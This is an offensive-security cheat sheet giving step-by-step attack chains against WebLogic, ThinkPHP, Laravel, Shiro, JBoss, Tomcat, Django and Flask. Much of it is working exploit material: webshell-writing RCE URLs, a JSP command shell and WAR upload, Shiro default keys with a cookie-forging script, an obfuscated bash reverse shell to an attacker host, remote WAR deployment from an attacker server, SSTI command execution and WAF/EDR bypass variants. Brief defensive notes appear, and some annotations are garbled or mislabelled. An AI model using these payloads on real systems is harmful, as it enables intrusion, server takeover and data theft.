**Vulnerability Principle:** High-risk WebLogic vulnerabilities: 1) T3 protocol deserialization (CVE-2015-4852/CVE-2018-2628, etc.) 2) XMLDecoder deserialization (CVE-2017-10271) 3) SSRF (CVE-2014-4210 accessing internal Redis) 4) unauthorized Console access 5) IIOP deserialization, etc. Each quarter Oracle's CPU fixes new WebLogic vulnerabilities.

**Exploitation Method:** Full exploitation flow:
1. Identify the WebLogic version
2. Detect open ports and endpoints
3. Choose an appropriate CVE exploit
4. Execute commands or write a WebShell

**Defensive Measures:** Defending against WebLogic vulnerabilities: promptly apply Oracle Critical Patch Updates (CPU), close unnecessary T3/IIOP protocol ports, restrict the admin console access IPs, deploy a web application firewall, use network segmentation to isolate WebLogic servers, and monitor for deserialization-related anomalous class loading.

---

### WebLogic T3 Protocol Attack  `weblogic-t3`
_WebLogic T3 protocol deserialization vulnerability_
Subcategory: **WebLogic T3** · tags: `weblogic` `t3` `deserialization` `java`

**Prerequisites:**
- WebLogic exposes the T3 port
- A vulnerable version exists

**Attack Chain:**

**1. Probe the T3 service**
> Probe the T3 service
```
# Scan the T3 port (default 7001)
nmap -sV -p 7001 target

# T3 handshake
echo "t3 12.2.1" | nc target 7001

# If it returns HELO, a T3 service exists
```
**Syntax breakdown:**
- `t3 12.2.1` — T3 protocol version handshake _value_

**2. Attack with tools**
> Attack with tools
```
# Use weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# Use WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# Use ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

**3. Build a malicious T3 request**
> Build a malicious T3 request
```
# Python script to build a T3 request
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3 handshake
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # Send the malicious serialized object
    # Build a T3 request containing the malicious object
    sock.send(payload)
    sock.close()

# Use ysoserial to generate the payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

**WAF/EDR Bypass Variants:**

**Gadget chain selection**
> Gadget chain selection
```
# Different gadget chains
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# Choose an appropriate chain based on the target environment
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different gadget chains
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# Choose an appropriate chain based on the target environment` — parameter and payload content _value_

**Overview:** The WebLogic T3 protocol is its proprietary RMI communication protocol, used for cluster inter-node communication and JNDI lookups. T3 protocol deserialization vulnerabilities allow a remote attacker to send malicious serialized objects and execute arbitrary code on the WebLogic server.

**Vulnerability Principle:** T3 protocol deserialization exploit chain: after establishing a connection via the T3 handshake, send serialized data containing a malicious gadget chain (such as the Commons Collections chain). Tools like ysoserial generate the payload, and tools such as T3Exploit/WebLogic-T3-RCE automate exploitation. WebLogic's blacklist filtering can be bypassed with new gadgets.

**Exploitation Method:** Full exploitation flow:
1. Probe the T3 port
2. Confirm the WebLogic version
3. Choose an appropriate gadget chain
4. Send the malicious serialized object
5. Execute commands

**Defensive Measures:** Defensive measures:
1. Disable the T3 protocol or restrict access
2. Apply the latest patches
3. Use a network firewall
4. Monitor anomalous serialization requests

---

### WebLogic IIOP Protocol Attack  `weblogic-iiop`
_WebLogic IIOP protocol deserialization vulnerability_
Subcategory: **WebLogic IIOP** · tags: `weblogic` `iiop` `deserialization` `corba`

**Prerequisites:**
- WebLogic exposes the IIOP port
- A vulnerable version exists

**Attack Chain:**

**1. Probe the IIOP service**
> Probe the IIOP service
```
# Scan the IIOP port	nmap -sV -p 7001 target

# IIOP uses the same port
# Detect whether IIOP is supported
# Detect using tools
```
**Syntax breakdown:**
- `nmap -sV` — use Nmap version detection to scan the target port service _command_
- `-p 7001` — WebLogic default port, shared by IIOP and T3 _parameter_
- `target` — target WebLogic server address _variable_

**2. CVE-2020-2551**
> CVE-2020-2551 exploitation
```
# Use weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# Compile and run
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# Use a JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```
**Syntax breakdown:**
- `CVE-2020-2551` — WebLogic IIOP protocol deserialization RCE vulnerability _command_
- `java -jar target/CVE-2020-2551.jar` — run the compiled exploit tool _command_
- `target 7001` — target address and WebLogic port _value_
- `JRMPListener 8888` — start a JRMP listener on the attacker machine to receive the callback _parameter_
- `CommonsCollections1` — specifies the gadget chain type returned to the target _parameter_

**3. Build an IIOP request**
> Build an IIOP request
```
# Build with Python
# Requires installing the relevant libraries
pip install idna

# Use JNDI injection
# Build a malicious JNDI reference
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# Use the JNDIExploit tool
java -jar JNDIExploit.jar -i attacker_ip
```
**Syntax breakdown:**
- `iiop://attacker:1099/Exploit` — IIOP-protocol JNDI lookup URL _value_
- `ctx.lookup(jndiURL)` — JNDI lookup triggers remote class loading to execute malicious code _command_
- `JNDIExploit.jar -i attacker_ip` — JNDI exploitation tool; -i specifies the attacker IP _command_

**WAF/EDR Bypass Variants:**

**Protocol switching**
> Protocol-switching bypass
```
# Switch between T3 and IIOP
# If T3 is disabled, try IIOP
# Use a different protocol to bypass detection
```
**Syntax breakdown:**
- `T3` — WebLogic proprietary protocol, often heavily monitored by WAFs _parameter_
- `IIOP` — CORBA standard protocol, similar to T3 in function but less detected by WAFs _parameter_
- `Protocol switching` — switch to IIOP to bypass protections when T3 is disabled/detected _command_

**Overview:** WebLogic IIOP (Internet Inter-ORB Protocol) is a CORBA standard communication protocol that also has deserialization vulnerabilities. When the T3 protocol is blocked by a firewall, the IIOP port (default 7001) can serve as an alternative attack entry point to achieve RCE.

**Vulnerability Principle:** IIOP deserialization is similar in principle to T3 but wraps things in the CORBA protocol. Attackers send malicious serialized objects over the IIOP protocol to bypass T3's blacklist filtering (because the two have different deserialization paths). Vulnerabilities such as CVE-2020-2551 achieve remote code execution over IIOP.

**Exploitation Method:** Full exploitation flow:
1. Probe the IIOP port
2. Use the CVE-2020-2551 exploit tool
3. Send the malicious serialized object
4. Execute commands

**Defensive Measures:** Defending against WebLogic IIOP vulnerabilities: if IIOP is not used, disable listening for that protocol; restrict network access to the IIOP port (allow only trusted cluster nodes); promptly apply Oracle security patches; and deploy deserialization protection middleware (such as RASP) to detect malicious class loading.

---

### ThinkPHP Remote Code Execution  `thinkphp-rce`
_ThinkPHP framework RCE vulnerabilities_
Subcategory: **ThinkPHP** · tags: `thinkphp` `rce` `php` `framework`

**Prerequisites:**
- Uses the ThinkPHP framework
- A vulnerable version exists

**Attack Chain:**

**1. ThinkPHP 5.x RCE**
> ThinkPHP 5.0.x RCE
```
# ThinkPHP 5.0.x RCE
# Method invocation
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# Write a WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# Execute a system command
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
**Syntax breakdown:**
- `invokefunction` — invoke-function method _value_
- `call_user_func_array` — PHP callback function _value_
- `vars[0]` — function-name parameter _value_

**2. ThinkPHP 5.1.x RCE**
> ThinkPHP 5.1.x RCE
```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```
**Syntax breakdown:**
- `eval()` — code execution _function_
- `%xx` — URL encoding _encoding_

**3. ThinkPHP 5.0.23 RCE**
> ThinkPHP 5.0.23 RCE
```
# POST method
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# Write a shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```
**Syntax breakdown:**
- `eval()` — code execution _function_
- `Content-Type` — content type header _header_

**4. Information gathering**
> Information gathering
```
# Get the ThinkPHP version
# Inspect the response headers
X-Powered-By: ThinkPHP 5.0.x

# Access specific pages
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# Error message leakage
# Trigger an error to view the version
```

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
# URL encoding
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# Mixed case
?s=/Index/\Think\App/invokefunction

# Double encoding
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` URL encoding
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# Mixed case
?s=/Index/\Think\App/invokefunction

# Double encoding
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction` — parameter and payload content _value_

**Path variants**
> Path-variant bypass
```
# Different path formats
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# Use different entry points
/index.php?s=...
/?s=...
/public/index.php?s=...
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different path formats
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# Use different entry points
/index.php?s=...
/?s=...
/public/index.php?s=...` — parameter and payload content _value_

**Overview:** ThinkPHP is the most popular PHP development framework in China, and its historical versions (3.x/5.x/6.x) have several remote code execution vulnerabilities. Because it is so widely used (Chinese government/enterprise, education, e-commerce), ThinkPHP vulnerabilities are a high-value target for mass exploitation.

**Vulnerability Principle:** High-risk ThinkPHP vulnerabilities: 1) 5.0.x route-parameter RCE (invoke arbitrary methods via controller/action injection) 2) 5.1.x Request-class method-override RCE 3) 5.x multi-language module file inclusion 4) 3.x cache-file write GetShell 5) 6.x deserialization POP chain. Exploitation URLs look like /index.php?s=/index/think\\app/invokefunction.

**Exploitation Method:** Full exploitation flow:
1. Identify the ThinkPHP version
2. Choose the corresponding exploitation method
3. Execute commands or write a shell
4. Obtain server privileges

**Defensive Measures:** Defending against ThinkPHP vulnerabilities: upgrade to the latest secure version, disable DEBUG mode and error display, configure strict route mode to forbid special characters in controller names, remove unnecessary entry files and modules, and deploy WAF rules to detect ThinkPHP signature payloads.

---

### Laravel Remote Code Execution  `laravel-rce`
_Laravel framework RCE vulnerabilities_
Subcategory: **Laravel** · tags: `laravel` `rce` `php` `framework`

**Prerequisites:**
- Uses the Laravel framework
- A vulnerable version or configuration exists

**Attack Chain:**

**1. CVE-2021-3129**
> CVE-2021-3129 Ignition RCE
```
# Laravel Ignition RCE
# Use a tool
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# Manual exploitation
# Need to send a Phar deserialization payload
# Generate with phpggc
phpggc Laravel/RCE1 system id > payload

# Send the request
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```
**Syntax breakdown:**
- `_ignition` — Ignition debug tool endpoint _value_
- `phar://` — Phar protocol triggers deserialization _value_

**2. Debug mode information leakage**
> Debug mode information leakage
```
# APP_DEBUG=true information leakage
# Access a page that triggers an error
# View sensitive information in the stack trace

# May leak:
- Database credentials
- API keys
- Environment variables
- Server paths
- Source code snippets
```

**3. .env file leakage**
> .env file leakage
```
# Try to access the .env file
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# The .env file contains:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```
**Syntax breakdown:**
- `127.0.0.1` — local loopback _domain_
- `../` — path traversal _path_
- `base64` — Base64 encoding _encoding_

**4. APP_KEY exploitation**
> APP_KEY exploitation
```
# After obtaining APP_KEY
# You can forge cookies
# Decrypt encrypted data

# Decrypt with a tool
php artisan decrypt <encrypted_value>

# Forge an admin cookie
# Need to understand the application's encryption method
```

**WAF/EDR Bypass Variants:**

**Path bypass**
> Path bypass
```
# Try different paths
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Try different paths
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env` — parameter and payload content _value_

**Overview:** Laravel is the most popular modern PHP framework; its RCE vulnerabilities mainly come from deserialization POP chains, Debug mode information leakage (the Ignition component), and insecure configuration (APP_KEY leakage leading to encrypted-cookie forgery).

**Vulnerability Principle:** Laravel vulnerabilities: 1) Ignition RCE (CVE-2021-3129, executes code by clearing logs + phar deserialization) 2) cookie deserialization (after APP_KEY leaks, forge an encrypted cookie to trigger a POP chain) 3) Debug mode leaks database passwords/API keys 4) Blade template injection ({!!$input!!} unescaped).

**Exploitation Method:** Full exploitation flow:
1. Detect the Laravel version and components
2. Attempt .env file leakage
3. Exploit Ignition RCE
4. Or exploit APP_KEY to forge identity

**Defensive Measures:** Defensive measures:
1. Disable debug mode
2. Upgrade the Ignition component
3. Protect the .env file
4. Rotate APP_KEY regularly

---

### Apache Shiro Deserialization  `shiro-deserialize`
_Apache Shiro RememberMe deserialization vulnerability_
Subcategory: **Apache Shiro** · tags: `shiro` `deserialization` `java` `rememberme`

**Prerequisites:**
- Uses Apache Shiro
- A vulnerable version exists

**Attack Chain:**

**1. Detect Shiro**
> Detect the Shiro framework
```
# Detect the rememberMe cookie
# rememberMe=deleteMe in the response indicates Shiro is in use

# Detect using tools
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# Or use a Burp plugin
# ShiroScan Burp plugin
```
**Syntax breakdown:**
- `rememberMe` — Shiro remember-me feature cookie _value_
- `deleteMe` — Shiro delete-cookie marker _value_

**2. Generate the payload with ysoserial**
> Generate a malicious payload
```
# Generate a malicious serialized object
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# Encrypt with Shiro's built-in key
# Default key: kPH+bIxk5D2deZiIxcaaaA==

# Python encryption script
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # Generate the payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES encryption
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```
**Syntax breakdown:**
- `base64` — Base64 encoding _encoding_
- `rememberMe` — Shiro remember-me _keyword_

**3. Send the malicious request**
> Send the malicious request
```
# Use curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# Use a tool
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# Use ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `-H` — custom request header _parameter_
- `rememberMe` — Shiro remember-me _keyword_

**4. Common key list**
> Common key list
```
# Common Shiro keys
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# Try different keys
# Or brute-force the key
```

**WAF/EDR Bypass Variants:**

**Gadget chain selection**
> Gadget chain selection
```
# Different gadget chains
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# Choose based on the target environment
# Some chains may be filtered
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different gadget chains
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# Choose based on the target environment
# Some chains may be filtered` — parameter and payload content _value_

**Key brute-forcing**
> Key brute-forcing
```
# Brute-force the key with a tool
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# Or use ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```
**Syntax breakdown:**
- `# Brute-force the key with a tool
git clone https://github.com/insightglacier/Shiro_exploit
python3 s` — attack payload _value_

**Overview:** The Apache Shiro RememberMe feature uses AES to encrypt a serialized object; a hardcoded key leads to a deserialization vulnerability.

**Vulnerability Principle:** The Apache Shiro RememberMe cookie is encrypted with AES-CBC (default key kPH+bIxk5D2deZiIxcaaaA==). Attack flow: 1) detect the signature (rememberMe=deleteMe in the cookie) 2) use the default key or brute-force the key 3) generate a gadget chain with ysoserial 4) AES-encrypt + Base64-encode and set as the cookie value.

**Exploitation Method:** Full exploitation flow:
1. Detect the Shiro framework
2. Obtain or brute-force the key
3. Generate a malicious serialized object
4. AES-encrypt and send it
5. Trigger deserialization to execute commands

**Defensive Measures:** Defensive measures:
1. Change the default key
2. Upgrade the Shiro version
3. Use a secure serialization scheme
4. Monitor anomalous cookies

---

### JBoss Exploitation  `jboss-vuln`
_JBoss application server vulnerabilities_
Subcategory: **JBoss** · tags: `jboss` `rce` `java` `deserialization`

**Prerequisites:**
- Uses a JBoss server
- A vulnerable version exists

**Attack Chain:**

**1. JMXInvokerServlet deserialization**
> JMXInvokerServlet deserialization
```
# CVE-2015-7501
# Send a malicious serialized object
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# Generate the payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# Send
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```
**Syntax breakdown:**
- `invoker/JMXInvokerServlet` — JBoss JMX invocation endpoint _encoding_
- `x-java-serialized-object` — Java serialized object type _value_

**2. Deploy a WAR via the JMX Console**
> Deploy a WAR via the JMX Console
```
# Access the JMX Console
http://target/jmx-console/

# Find the deploy method
# Find jboss.system:service=MainDeployer

# Deploy a remote WAR
# Use the deploy method with the URL parameter pointing to the malicious WAR
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# Access the deployed shell
http://target/shell/cmd.jsp?cmd=id
```

**3. BSHDeployer deployment**
> BSHDeployer deployment
```
# Deploy with BeanShell
# Find jboss.scripts:service=BSHDeployer

# Execute the BeanShell script
# Via the createScriptDeployment method

# Build the malicious script
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `Runtime.exec` — Java command execution _function_

**4. Use tools**
> Use the JexBoss tool
```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# Automated exploitation
python jexboss.py -mode file-scan -file hosts.txt
```

**WAF/EDR Bypass Variants:**

**Endpoint variants**
> Endpoint variants
```
# Different endpoints
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different endpoints
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/` — parameter and payload content _value_

**Overview:** JBoss (now WildFly) is Red Hat's Java application server and has historically had many severe vulnerabilities: JMXInvokerServlet deserialization, unauthorized deployment via the JBossAS management console, EJBInvokerServlet remote invocation, etc., making it a high-risk asset in internal Java environments.

**Vulnerability Principle:** High-risk JBoss vulnerabilities: 1) JMXInvokerServlet deserialization (CVE-2015-7501) 2) /jmx-console/ unauthorized access to deploy a WAR backdoor 3) /invoker/JMXInvokerServlet remote method invocation 4) EJBInvokerServlet deserialization 5) JBoss Seam parameter injection (CVE-2010-1871) 6) management console weak credentials (admin:admin).

**Exploitation Method:** Full exploitation flow:
1. Scan for JBoss services
2. Detect open endpoints
3. Exploit deserialization or deploy a WAR
4. Obtain server privileges

**Defensive Measures:** Defensive measures:
1. Remove unnecessary endpoints
2. Enforce access control
3. Upgrade the JBoss version
4. Network isolation

---

### Apache Tomcat Vulnerabilities  `tomcat-vuln`
_Apache Tomcat server exploitation_
Subcategory: **Tomcat** · tags: `tomcat` `rce` `java` `manager`

**Prerequisites:**
- Uses a Tomcat server
- A vulnerable version or configuration exists

**Attack Chain:**

**1. Manager App weak credentials**
> Manager App weak credentials
```
# Access the Manager App
http://target/manager/html

# Common weak credentials
tomcat:tomcat
admin:admin
admin:tomcat

# Brute-force with a tool
hydra -l tomcat -P passwords.txt target http-get /manager/html
```
**Syntax breakdown:**
- `/manager/html` — Tomcat management interface _value_

**2. Deploy a WAR**
> Deploy a WAR
```
# Generate a malicious WAR
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# Package
jar cvf shell.war cmd.jsp

# Upload via Manager
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# Access the shell
http://target/shell/cmd.jsp?cmd=id
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `curl` — HTTP request tool _command_
- `Runtime.exec` — Java command execution _function_

**3. CVE-2020-1938 Ghostcat**
> CVE-2020-1938 Ghostcat
```
# AJP file read/inclusion
# Use a tool
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# Or use a dedicated tool
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```
**Syntax breakdown:**
- `AJP` — Apache JServ Protocol _value_
- `8009` — AJP default port _value_

**4. Arbitrary file write via the PUT method**
> Arbitrary file write via the PUT method
_platform: windows_
```
# CVE-2017-12615
# Write a file via the PUT method on Windows
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Or use ::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# Or use /
PUT /shell.jsp/ HTTP/1.1
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_
- `%xx` — URL encoding _encoding_
- `Runtime.exec` — Java command execution _function_

**WAF/EDR Bypass Variants:**

**Filename bypass**
> Filename bypass
```
# Different filename variants
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` Different filename variants
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP` — parameter and payload content _value_

**Overview:** Apache Tomcat is the most widely used Java Servlet container. Common vulnerabilities include AJP file read/inclusion (GhostCat), PUT-method file write, and Manager WAR-backdoor deployment. Tomcat Manager application weak credentials (tomcat:tomcat) are the most common intrusion entry point.

**Vulnerability Principle:** High-risk Tomcat vulnerabilities: 1) AJP protocol file read/inclusion (CVE-2020-1938 GhostCat) 2) PUT-method file write (CVE-2017-12615) 3) Manager application weak credentials deploying a WAR WebShell 4) session deserialization (FileStore persistence) 5) JSP execution path traversal (CVE-2020-9484) 6) default page information leakage.

**Exploitation Method:** Full exploitation flow:
1. Scan for Tomcat services
2. Attempt weak-credential login
3. Deploy a malicious WAR
4. Or exploit another CVE

**Defensive Measures:** Defensive measures:
1. Change default credentials
2. Restrict Manager access
3. Disable AJP or configure a secret
4. Upgrade the Tomcat version

---

### Django Framework Vulnerabilities  `django-vuln`
_Django framework security vulnerabilities_
Subcategory: **Django** · tags: `django` `python` `framework` `sql`

**Prerequisites:**
- Uses the Django framework
- A vulnerable version exists

**Attack Chain:**

**1. SQL injection**
> CVE-2020-7471 SQL injection
```
# CVE-2020-7471
# Via PostgreSQL input validation bypass
# Using JSONField/HStoreField

# Build a malicious query
Model.objects.filter(data__contains={"key": "value; SELECT SLEEP(5);--"})

# Or use ArrayField
Model.objects.filter(tags__contains=["tag'); SELECT SLEEP(5);--"])

# Trigger the SQL injection
```
**Syntax breakdown:**
- `JSONField` — Django JSON field _value_
- `__contains` — Django query syntax _value_

**2. Debug mode information leakage**
> Debug mode information leakage
```
# When DEBUG=True
# The error page leaks:
- Source code
- Environment variables
- Database configuration
- SECRET_KEY
- Server paths

# Access a nonexistent page to trigger an error
http://target/nonexistent

# Or trigger an exception
```

**3. SECRET_KEY exploitation**
> SECRET_KEY exploitation
```
# After obtaining SECRET_KEY
# You can:
# 1. Sign and forge a session
# 2. Sign and forge a CSRF token
# 3. Password reset token

# Use the django-session-cleanup tool
# Or unsign manually

import django.core.signing as signing

# Unsign the session
signing.loads(session_value, key=SECRET_KEY)

# Sign and forge the session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

**4. Path traversal**
> Path traversal vulnerability
```
# CVE-2021-28658
# Django static file path traversal
GET /static/../../../../etc/passwd

# Detect with a tool
curl http://target/static/../../../../etc/passwd
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `../` — path traversal _path_
- `/etc/passwd` — sensitive file path _path_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding bypass
```
# URL encoding
/static/%2e%2e/%2e%2e/etc/passwd

# Double encoding
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode encoding
/static/..%c0%af..%c0%af/etc/passwd
```
**Syntax breakdown:**
- `#` — command/payload prefix _command_
- ` URL encoding
/static/%2e%2e/%2e%2e/etc/passwd

# Double encoding
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode encoding
/static/..%c0%af..%c0%af/etc/passwd` — parameter and payload content _value_

**Overview:** Django is Python's most mature web framework; its security mechanisms are robust but vulnerabilities still exist: SQL injection (JSONField/Raw SQL), Debug mode information leakage, CSRF token bypass, template injection (custom tags), etc. Django's security response team promptly releases security updates.

**Vulnerability Principle:** Django vulnerabilities: 1) Debug mode (DEBUG=True) leaks the full configuration, database information, and source code paths 2) JSONField/HStoreField SQL injection (CVE-2019-14234) 3) truncation attacks (email address truncation bypass) 4) StringAgg SQL injection 5) URL validation bypass (is_valid_url) 6) password reset token prediction.

**Exploitation Method:** Full exploitation flow:
1. Detect the Django version
2. Use debug mode to obtain information
3. Exploit SQL injection
4. Or exploit SECRET_KEY to forge identity

**Defensive Measures:** Defensive measures:
1. Disable debug mode
2. Upgrade the Django version
3. Protect SECRET_KEY
4. Input validation

---

### Flask Framework Vulnerabilities  `flask-vuln`
_Flask framework security vulnerabilities_
Subcategory: **Flask** · tags: `flask` `python` `framework` `ssti`

**Prerequisites:**
- Uses the Flask framework
- A vulnerable configuration exists

**Attack Chain:**

**1. SSTI template injection**
> SSTI template injection
```
# Jinja2 template injection probing
{{7*7}}
${7*7}
<%= 7*7 %>

# If it returns 49, SSTI exists

# Get the configuration
{{config}}
{{self.__class__}}

# Command execution
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
**Syntax breakdown:**
- `{{...}}` — Jinja2 template syntax _value_
- `__class__` — get the object's class _value_
- `__mro__` — method resolution order _value_

**2. SECRET_KEY exploitation**
> SECRET_KEY exploitation
```
# Flask session signing
# After obtaining SECRET_KEY you can forge a session

# Unsign the session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# Unsign
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# Sign and forge
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# Forge an admin session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

**3. Debug mode RCE**
> Debug mode RCE
```
# Flask Debug mode
# Access /debug or /console
# You can execute arbitrary Python code

# Werkzeug Debug Console
# Access:
http://target/console

# Execute code
import os; os.system('id')
__import__('os').system('id')
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `;` — command separator _operator_

**4. PIN code bypass**
> PIN code bypass
```
# Flask Debug PIN
# Need to obtain:
# 1. Username
# 2. modname
# 3. app path
# 4. MAC address

# Read information
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# Compute the PIN
# Use a script to compute the Werkzeug PIN
```

**WAF/EDR Bypass Variants:**

**SSTI bypass**
> SSTI bypass
```
# Filter bypass
# Use attr
